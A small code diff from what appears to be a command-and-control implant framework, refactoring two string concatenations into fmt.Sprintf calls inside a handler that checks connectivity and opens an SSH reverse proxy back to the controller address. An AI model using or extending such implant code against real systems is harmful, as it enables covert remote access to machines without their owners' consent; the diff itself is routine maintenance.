@@ -63,7 +63,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			out = fmt.Sprintf("Error args error: %v", cmdSlice)
 			return
 		}
-		out = "Bring2CC: Reverse proxy for " + *addr + " finished"
+		out = fmt.Sprintf("Bring2CC: Reverse proxy for %s finished", *addr)
 
 		hasInternet := tun.HasInternetAccess(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
 		isProxyOK := tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress)
@@ -76,7 +76,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			}
 		}
 
-		targetAddrWithPort := *addr + ":" + RuntimeConfig.ReverseProxyPort
+		targetAddrWithPort := fmt.Sprintf("%s:%s", *addr, RuntimeConfig.ReverseProxyPort)
 		ctx, cancel := context.WithCancel(context.Background())
 		if err = tun.SSHReverseProxyClient(targetAddrWithPort, RuntimeConfig.Password,
 			&ReverseConns,
